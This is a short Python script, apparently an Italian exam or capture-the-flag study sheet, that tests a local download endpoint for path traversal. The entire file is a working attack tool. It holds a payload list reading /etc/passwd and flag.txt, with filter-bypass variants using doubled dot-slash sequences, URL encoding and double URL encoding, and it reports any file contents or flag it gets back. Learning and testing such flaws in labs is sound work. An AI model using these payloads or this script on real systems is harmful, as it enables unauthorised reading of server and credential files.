#!/usr/bin/env python3
"""
PRONTUARIO #07: Path Traversal (Directory Traversal) Tester & Validator
------------------------------------------------------------------------
Modulo: Web Security / Path Traversal
Descrizione: Verifica automatica di vulnerabilità Path Traversal su parametri
            HTTP GET e test di bypass su filtri incomplete.
"""

import requests

# ==================== INPUT DATI D'ESAME ====================
TARGET_URL = "http://127.0.0.1:5000/download"  # URL dell'endpoint vulnerabile
PARAM_NAME = "file"                             # Nome del parametro GET (es. 'file', 'doc', 'page')

# LISTA PAYLOAD PATH TRAVERSAL (Linux / Windows)
TRAVERSAL_PAYLOADS = [
    "../../../../etc/passwd",
    "../../../../flag.txt",
    "....//....//....//....//etc/passwd",      # Bypass filtro single-pass replace
    "....//....//....//....//flag.txt",
    "..%2f..%2f..%2f..%2fetc%2fpasswd",        # URL Encoding bypass
    "..%252f..%252f..%252f..%252fetc%252fpasswd" # Double URL Encoding bypass
]
# ============================================================


def main():
    print(f"[*] Avvio Path Traversal Test su Target: {TARGET_URL}")
    print(f"[*] Parametro analizzato: {PARAM_NAME}\n")

    found = False
    for payload in TRAVERSAL_PAYLOADS:
        params = {PARAM_NAME: payload}
        print(f"[*] Testing Payload: {payload}")

        try:
            response = requests.get(TARGET_URL, params=params, timeout=5)

            # Se la risposta contiene evidenze di /etc/passwd o il formato flag{...}
            if response.status_code == 200 and ("root:x:" in response.text or "flag{" in response.text):
                print("\n=== VULNERABILITÀ PATH TRAVERSAL CONFERMATA! ===")
                print(f" Payload Vincente : {payload}")
                
                if "flag{" in response.text:
                    start_idx = response.text.find("flag{")
                    end_idx = response.text.find("}", start_idx) + 1
                    print(f" Flag Trovata     : {response.text[start_idx:end_idx]}")
                elif "root:x:" in response.text:
                    print(" Lettura /etc/passwd confermata nel corpo della risposta.")
                
                print("=================================================\n")
                found = True
                break

        except Exception as e:
            print(f"[!] Errore di connessione: {e}")

    if not found:
        print("[!] Nessun payload ha restituito file di sistema o flag.")


if __name__ == "__main__":
    main()
